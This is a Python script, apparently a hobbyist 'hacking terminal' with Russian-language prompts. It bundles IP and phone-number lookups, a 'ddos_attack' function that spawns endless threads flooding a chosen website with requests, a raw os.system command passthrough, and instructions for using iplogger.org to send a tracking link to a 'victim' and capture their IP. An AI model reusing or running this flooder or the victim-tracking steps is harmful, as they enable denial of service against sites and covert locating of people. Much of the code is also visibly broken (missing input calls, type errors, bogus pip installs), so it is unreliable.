from datetime import datetime
from colorama import init
init()
def time123():
    current_datetime = datetime.now()
    print(current_datetime)
def ip():
    import requests
    import time
    import random
    global get_ip
    get_ip = input('[+] IP > > > ')

    def load():
        m = 0
        q = random.randint(1, 6)
        print("")
        while m != q:
            time.sleep(0.5)
            print("loading...")
            m += 1

    def info():
        load()
        response = requests.get(f'http://ipinfo.io/{get_ip}/json')

        user_ip = response.json()['ip']
        user_city = response.json()['city']
        user_region = response.json()['region']
        user_country = response.json()['country']
        user_location = response.json()['loc']
        user_org = response.json()['org']
        user_timezone = response.json()['timezone']
        global all_info
        all_info = f'Fore.RED + \n<Info>\nIP : {user_ip}\nСити : {user_city}\nРегион : {user_region}\nСтрана : {user_country}\nЛокация : {user_location}\nОгранизация : {user_org}\nЗона : {user_timezone}'
        print(all_info)

    def record():
        user_record = '\n[?] Хотите информацию закинуть на текстовом документе? (д/н): '
        if user_record == 'д':
            g = random.randint(0, 10000)
            file = open('ip_data' + g + '.txt', 'a')  # вся инфа в файле ip.txt
            file.write(f'{all_info}\n')
            file.close()
        if user_record == 'n':
            print('\n<O.K>')

    def main():
        info()
        record()

    main()
    print('Данная функция ещё не доработана')


def numinfo():
    import urllib.request
    import json
    phone = input("Enter phone: ")
    getInfo = "https://htmlweb.ru/geo/api.php?json&telcod=" + phone
    try:
        infoPhone = urllib.request.urlopen(getInfo)
    except:
        print("\n[!] - Phone not found - [!]\n")
    infoPhone = json.load(infoPhone)
    print(u"Номер сотового > > >", "+" + phone)
    print(u"Страна > > > ", infoPhone["country"]["name"])
    print(u"Регион > > > ", infoPhone["name"])
    print(u"Округ > > > ", infoPhone["region"]["okrug"])
    print(u"Оператор > > > ", infoPhone["0"]["oper"])
    print(u"Часть света > > > ", infoPhone["country"]["location"])


def ddos_attack():
    import threading
    import requests
    site = input('[+] Site : ')
    zapross = input('Колличество входов(Не больше 100)')
    asdf = zapross.isdigit()

    def ddos_attack_start():
        a = 0
        while a != zapross:
            def dos():
                while True:
                    requests.get(site)

            while True:
                threading.Thread(target=dos).start()
            a += 1
            print(a)

    if asdf == 'False':
        print('[+] Error > Это не число')
    elif int(zapross) > 100:
        print('[+] Error > Ваше устройство не поддерживает больше 100 входов!')
    elif int(zapross) < 0:
        print('[+] Число должно быть больше нуля!')
    else:
        ddos_attack_start()


def colortxtx():
    from colorama import init, Fore
    from colorama import Back
    from colorama import Style
    init(autoreset=True)


def hacksim():
    e = 0
    import random
    from colorama import init, Fore
    from colorama import Back
    from colorama import Style
    init(autoreset=True)
    asd = input(
        'Сколько раз повторить цикл фейкового взлома\nВведите 0 чтобы это продолжалось бесконечно (Для того чтобы закончить цикл перезапустите консоль)\n[+] Input:  ')
    if int(asd) == 0:
        while 1:
            z = random.randint(0, 1)
            x = random.randint(0, 1)
            c = random.randint(0, 1)
            v = random.randint(0, 1)
            a = str(z) + str(x) + str(c) + str(v)
            d = str(a) * 10
            print(Fore.GREEN + '' + str(d) * 50)
    else:
        while int(e) <= int(asd):
            e = e + 1
            z = random.randint(0, 1)
            x = random.randint(0, 1)
            c = random.randint(0, 1)
            v = random.randint(0, 1)
            a = str(z) + str(x) + str(c) + str(v)
            d = str(a) * 00
            print(Fore.GREEN + '' + d)


import os
import time
from colorama import init, Fore
from colorama import Back
from colorama import Style
init(autoreset=True)
print(Fore.BLUE + '[#.......................]', end="")
time.sleep(0.1)
print(Fore.BLUE + '\r[##......................]', end="")
time.sleep(0.1)
print(Fore.BLUE + '\r[###.....................]', end="")
time.sleep(0.1)
print(Fore.BLUE + '\r[####....................]', end="")
time.sleep(0.1)
print(Fore.BLUE + '\r[#####...................]', end="")
time.sleep(0.1)
print(Fore.BLUE + '\r[######..................]', end="")
time.sleep(0.1)
print(Fore.BLUE + '\r[#######.................]', end="")
time.sleep(0.1)
print(Fore.BLUE + '\r[########................]', end="")
time.sleep(0.1)
print(Fore.BLUE + '\r[#########...............]', end="")
time.sleep(0.1)
print(Fore.BLUE + '\r[##########..............]', end="")
time.sleep(0.1)
print(Fore.BLUE + '\r[###########.............]', end="")
time.sleep(0.1)
print(Fore.BLUE + '\r[############............]', end="")
time.sleep(0.1)
print(Fore.BLUE + '\r[#############...........]', end="")
time.sleep(0.1)
print(Fore.BLUE + '\r[##############..........]', end="")
time.sleep(0.1)
print(Fore.BLUE + '\r[###############.........]', end="")
time.sleep(0.1)
print(Fore.BLUE + '\r[################........]', end="")
time.sleep(0.1)
print(Fore.BLUE + '\r[#################.......]', end="")
time.sleep(0.1)
print(Fore.BLUE + '\r[##################......]', end="")
time.sleep(0.1)
print(Fore.BLUE + '\r[###################.....]', end="")
time.sleep(0.1)
print(Fore.BLUE + '\r[####################....]', end="")
time.sleep(0.1)
print(Fore.BLUE + '\r[#####################...]', end="")
time.sleep(0.1)
print(Fore.BLUE + '\r[######################..]', end="")
time.sleep(0.1)
print(Fore.BLUE + '\r[#######################.]', end="")
time.sleep(0.1)
print(Fore.BLUE + '\r[########################]', end="")
time.sleep(0.1)
print(Fore.BLUE + '\r[𝙲𝚘𝚗𝚗𝚎𝚌𝚝𝚒𝚗𝚐 𝚝𝚑𝚎 𝙷𝚊𝚌𝚔𝚒𝚗𝚐 𝙻𝚒𝚋𝚎𝚛𝚢]')
time.sleep(2)





print('╔═══╦╗───────╔╗─ ╔╗────────────╔╗')
print('║╔═╗║║──────╔╝╚╗ ║║────────────║║')
print('║╚══╣║╔╦═╦╦═╩╗╔╝ ║║──╔╦╗╔╦══╦══╣║╔╗')
print('╚══╗║╚╝╣╔╬╣╔╗║║  ║║─╔╬╣╚╝║║═╣║═╣╚╝╝')
print('║╚═╝║╔╗╣║║║╚╝║╚╗ ║╚═╝║║║║║║═╣║═╣╔╗╗')
print('╚═══╩╝╚╩╝╚╣╔═╩═╝ ╚═══╩╩╩╩╩══╩══╩╝╚╝')
print('──────────║║')
print('──────────╚╝')

time.sleep(2)


init(autoreset=True)







os.system('cls||clear')
os.system('pip install colorama')
os.system('pip install json')
os.system('pip install requests')
os.system('pip install urllib.request')
os.system('pip install get_ip')
os.system('pip install os')
version = '1.1.0'
os.system('cls||clear')
version = '2.0.0'
print(Fore.LIGHTCYAN_EX + 'Terminal Soft\nVersion: ' + version + '\nMeade by Limeek')
m = 1

while m:
    cmd = input(Fore.BLUE + 'Enter your command > > >')
    if cmd == 'ip' or cmd == 'getip' or cmd == 'iphack':
        ip()
    elif cmd == 'numinfo' or cmd == 'ninfo' or cmd == 'nuberhack' or cmd == 'phoneinfo':
        numinfo()
    elif cmd == 'Ddos' or cmd == 'dos' or cmd == 'dosatack':
        ddos_attack()
    elif cmd == 'exit':
        m = 0
        d = datetime.now()
        print('Дата завершения: ' + str(d))
    elif cmd == 'cls' or cmd == 'clear':
        import os

        os.system('cls||clear')
    elif cmd == 'os':
        cmd1 = input(Fore.YELLOW + 'Введите команду > > >')
        if cmd1 == 'python':
            print('Нельзя вызвать пайтон в пайтоне!')
        elif cmd1 == 'cmd':
            print('Неизвестная ошибка')
        else:
            os.system(cmd1)
    elif cmd.startswith("open"):
        if cmd.endswith("com") or cmd.endswith("ua") or cmd.endswith("ru") or cmd.endswith("org") or cmd.endswith("net") or cmd.split()[1].strip() == 'https':
            import webbrowser

            words = cmd.split(' ')
            fragment = ''
            new_words = []
            for word in words:
                if fragment not in word:
                    new_words.append(word)
            new_words
            ' '.join(new_words)

            webbrowser.open(word, new=1, autoraise=True)
        if cmd.endswith(".py"):
            import os

            words = cmd.split(' ')
            fragment = '$$$$$$$$'
            new_words = []
            for word in words:
                if fragment not in word:
                    new_words.append(word)
            new_words
            ' '.join(new_words)
            os.startfile(word)
    elif cmd == 'iplogger':
        poi = input('Показать инструкцию по использованию [Y/n]')
        if poi == 'y':
            print('Сейчас вас перебросит на сайт\n''У вас появится поле и 2 кнопки (Create a shortlink) и (Its a tracking code)\nТак же у вас есть поле, в него вы должны выбрать куда будет вести ссылка\nДалее нажимаем на кнопку (Create a shortlink)\nПосле чего вы должны принять условия использования\nПараметры Collect SMART data и Forward GET parameters нужно включить\nДалее мы выдим ссылки, нам нужна Its your logger link\n!Так же скопируйте Link for access to statistics для себя\nПо необходимости настраиваем её\nТеперь скидываем эту ссылку жертве\n Как только он(а) зайдёт вы переходите по вашей ссылке Link for access to statistics\nПереходим в пункт visitors ниже, и смотрим айпи')
            zxc = input('Введите любой символ чтобы продолжить')
        else:
            print(null = '')
            #ds
        import os
        import webbrowser

        word = 'https://iplogger.org'
        webbrowser.open(word, new=1, autoraise=True)
    elif cmd == 'hacksimulation':
        hacksim()
    elif cmd == 'time':
        time123()
    else:
        print(Fore.RED + 'Error: command ' + Fore.GREEN + '"' + cmd + '"' + Fore.RED + ' not found')
